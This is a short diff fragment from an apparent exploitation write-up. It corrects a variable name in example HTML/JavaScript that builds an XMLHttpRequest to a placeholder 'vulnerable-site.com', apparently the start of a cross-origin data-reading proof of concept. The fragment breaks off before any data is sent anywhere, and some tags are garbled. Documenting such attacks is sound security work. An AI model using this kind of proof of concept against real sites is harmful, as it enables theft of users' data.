@@ -54,7 +54,7 @@ Exploitation
 ``` <html> ‹body›
         <h1›Hello World!‹/h1>
         <scripts>
-        var hr = new XMLHttpRequest () ;
+        var xhr = new XMLHttpRequest () ;
         var url = "<https://vulnerable-site.com>"
         xhr.onreadystatechange = function() {
              if (xhr.readyState == XMLHttpRequest.DONE) {
